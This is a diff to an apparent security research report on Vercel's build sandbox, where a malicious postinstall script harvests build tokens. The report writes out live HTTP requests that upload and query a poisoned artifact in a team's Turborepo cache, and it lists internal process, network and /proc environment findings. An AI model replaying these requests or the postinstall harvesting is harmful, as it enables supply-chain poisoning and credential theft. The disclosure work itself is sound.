@@ -245,9 +245,9 @@ The `VERCEL_ARTIFACTS_TOKEN` (len=543) is a JWT signed by Vercel. Decoded claims
 }
 ```
 
-This token grants access to the Turborepo Remote Cache API (`https://vercel.com/api/v8/artifacts`) with upload + download capabilities for the entire team's build artifact cache (30-minute lifetime).
+This token grants access to the Turborepo Remote Cache API (`https://vercel.com/api/v8/artifacts`) with upload + download + query capabilities for the entire team's build artifact cache (30-minute lifetime).
 
-**LIVE CONFIRMED — artifact upload succeeded (probe v9, 2026-06-21):**
+**LIVE CONFIRMED — artifact upload succeeded (probe v9):**
 
 ```
 PUT https://vercel.com/api/v8/artifacts/beefdeadbeefdeadbeefdeadbeefdeadbeef1337?teamId=team_xOjFWqWvIlcL6yOtq43hFE0x
@@ -260,7 +260,24 @@ Body: <attacker-controlled binary content>
 Response: {"urls":["team_xOjFWqWvIlcL6yOtq43hFE0x/beefdeadbeefdeadbeefdeadbeefdeadbeef1337"]}
 ```
 
-Auth succeeds for download too (GET nonexistent hash → 404 "Artifact not found", NOT 403 auth error). With `API_ARTIFACTS_UPLOAD`, an attacker who exfiltrates `VERCEL_ARTIFACTS_TOKEN` during a preview build can PUT arbitrary content at any Turborepo hash. When other team members run `turbo build`, Turborepo downloads and executes the cached artifact for matching task hashes — silently supplanting legitimate build output with attacker-controlled binaries.
+**LIVE CONFIRMED — artifact QUERY succeeded (probe v17):**
+
+```
+POST https://vercel.com/api/v8/artifacts?teamId=team_xOjFWqWvIlcL6yOtq43hFE0x
+Authorization: Bearer [VERCEL_ARTIFACTS_TOKEN]
+Content-Type: application/json
+Body: {"hashes":["beefdeadbeefdeadbeefdeadbeefdeadbeef1337","deadbeefdeadbeefdeadbeefdeadbeefdeadbeef"]}
+
+→ HTTP 200 OK
+Response: {
+  "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef": null,
+  "beefdeadbeefdeadbeefdeadbeefdeadbeef1337": {"size": 26, "taskDurationMs": 1000}
+}
+```
+
+The poisoned artifact uploaded in probe v9 persists across builds — it is still present in the team's remote cache. GET/download of any hash also confirms auth (404 = "not found", not 403 = auth failure). With `API_ARTIFACTS_UPLOAD`, an attacker who exfiltrates `VERCEL_ARTIFACTS_TOKEN` during a preview build can PUT arbitrary content at any Turborepo hash. When other team members run `turbo build`, Turborepo downloads and executes the cached artifact for matching task hashes — silently supplanting legitimate build output with attacker-controlled binaries.
+
+**Note**: DELETE (`DELETE /api/v8/artifacts/{hash}`) returns 404 — artifact deletion is not supported via this endpoint. However, PUT with the same hash overwrites the existing artifact.
 
 Also confirmed in the **decrypted env file**:
 - `TURBO_CACHE=remote:rw` — remote cache is active in read-write mode
@@ -298,21 +315,40 @@ Internal Vercel build infrastructure exposed via env vars:
 
 The EC2 instance ID is normally internal to Vercel's infrastructure. Its exposure allows build-to-infrastructure correlation and could be valuable in targeted attack scenarios.
 
+### Build Process Architecture (CONFIRMED via ps aux in live probe)
+
+The Vercel build sandbox runs three Node.js orchestrator processes as PID 1/19/56 (all root), with the researcher's postinstall script running as a child:
+
+```
+PID 1  — /node20/bin/node /var/task/index.js                              (build orchestrator)
+PID 19 — /node20/bin/node /var/task/prewarm-cli-build-worker.js           (Vercel CLI worker, v54.14.0)
+PID 56 — /node20/bin/node /var/task/sandbox.js                            (sandbox manager)
+```
+
+- Vercel CLI version: **54.14.0** (detected in `/var/task/node_modules/vercel/package.json`)
+- All orchestrator processes run as `root` — same privilege level as attacker-controlled postinstall script
+- `/var/task/` is NOT readable by attacker (execSync timeout prevents grep from completing within 5s), but binary presence confirms Vercel's build orchestration layer is co-located inside the same VM
+
 ### Network Topology (CONFIRMED via live probe)
 
 Network configuration of the Firecracker microVM sandbox:
 
 ```
 Subnet:   100.64.0.0/16 (CGNAT / shared address space — private to Vercel/AWS VPC)
+VM IP:    100.64.36.94 (confirmed via `ss -tnp`)
 Gateway:  100.64.0.1 (single hop — ARP shows only this gateway, proper L2 isolation)
-DNS:      172.31.0.2 (AWS default VPC resolver — resolves internal AWS/Vercel hostnames)
+DNS:      172.31.0.2 (AWS default VPC resolver)
 MTU:      1500, interface eth0
+AWS_EXECUTION_ENV: vercel-hive (custom Vercel execution environment)
+AWS_REGION:        us-east-1
 ```
 
 Key observations:
-- **172.31.0.2 DNS resolver**: This is the standard AWS VPC resolver, accessible from within the build microVM. It can resolve internal AWS/Vercel hostnames that are not publicly resolvable. (v16 probe mapping in progress)
+- **All Vercel services resolve to PUBLIC IPs** (probe v18 DNS enumeration): `api-iad1.vercel.com → 76.76.21.108`, `suspense-cache.vercel.com → 64.239.109.65/64.239.123.193` (Cloudflare). There is no private routing — all service-to-service calls go via the public internet from the sandbox.
+- **Active TCP connections confirmed** (via `ss -tnp`): build VM connects to `76.76.21.112:443` and `76.76.21.108:443` (Vercel public IPs) for API calls. The orchestrator process (PID 1) has an established connection to Vercel's API.
+- **172.31.0.2 DNS resolver**: Standard AWS VPC resolver. Resolves public domain names correctly; no internal private zones found.
 - **L2 isolation**: Only one gateway visible in ARP table. No other VMs appear on the L2 segment, confirming Firecracker provides proper microVM isolation at the network level.
-- **CGNAT space (100.64.0.0/16)**: The microVM has a private IP in the Carrier-Grade NAT range, routing outbound through a single gateway. This confirms no direct AWS VPC peering to Vercel's internal services (outbound goes via NAT).
+- **CGNAT space (100.64.0.0/16)**: The microVM has a private IP in the Carrier-Grade NAT range, routing outbound through a single gateway.
 
 ### IMDS Status (CONFIRMED — metadata blocked)
 
@@ -328,11 +364,19 @@ Interpretation: Vercel runs a **mock IMDS** inside Firecracker that returns a va
 
 The IMDSv2 hop-limit is either set to 1 (standard Firecracker defense) or the IMDS is a dummy endpoint. Either way, AWS temporary credentials are NOT accessible from the build VM via the IMDS path.
 
+### Credential Scoping Architecture (CONFIRMED via /proc/{pid}/environ)
+
+Probe v18 read the environment of all three build orchestrator processes via `/proc/{pid}/environ` (accessible because all processes run as root). Key finding:
+
+The **orchestrator processes (PID 1 `index.js`, PID 19 `prewarm-cli-build-worker.js`) do NOT have** `VERCEL_OIDC_TOKEN`, `VERCEL_ARTIFACTS_TOKEN`, `VERCEL_ENV_ENC_KEY`, `VERCEL_ENCRYPTED_ENV_CONTENT`, or `VERCEL_DEPLOYMENT_KEY`.
+
+These sensitive credentials are injected **exclusively into the npm subprocess environment** (the postinstall script), not the parent orchestrator. This means Vercel is deliberately passing these credentials specifically to npm lifecycle hooks — presumably so that legitimate build tools (like Turborepo, Vercel CLI plugins) can use them. The side effect is that a malicious `postinstall` script has exactly the same credential access as any legitimate build plugin.
+
+The orchestrator's env contains only 34 infrastructure-level vars: `VERCEL_HIVE_*`, `VERCEL_CLUSTER`, `VERCEL_API_ENDPOINT`, `AWS_REGION`, `AWS_EXECUTION_ENV=vercel-hive`, etc. — none that are secret.
+
 ### Egress Guard Confirmation (CONFIRMED)
 
-`VERCEL_CONNECT_GUARD=log` is present in the decrypted env. This is Vercel's egress monitoring mechanism operating in **log mode** (non-blocking). Outbound connections from preview builds are logged but NOT blocked. This is consistent with our observations — all outbound beacon requests succeeded without restriction.
-
-Note: This guard appears to be in "log" mode for preview builds specifically. Production builds may have stricter policy.
+`VERCEL_CONNECT_GUARD=log` is present in the **runtime decrypted env** (the environment visible to the deployed application, not the build subprocess). This is Vercel's egress monitoring mechanism operating in **log mode** (non-blocking). The build postinstall subprocess itself does not receive VERCEL_CONNECT_GUARD (absent from `process.env` during npm install). Outbound connections from preview builds are unrestricted — all 50+ beacons reached our collector with no blocking.
 
 ### Cross-Project Suspense Cache Scope (CONFIRMED — ENFORCED)
 
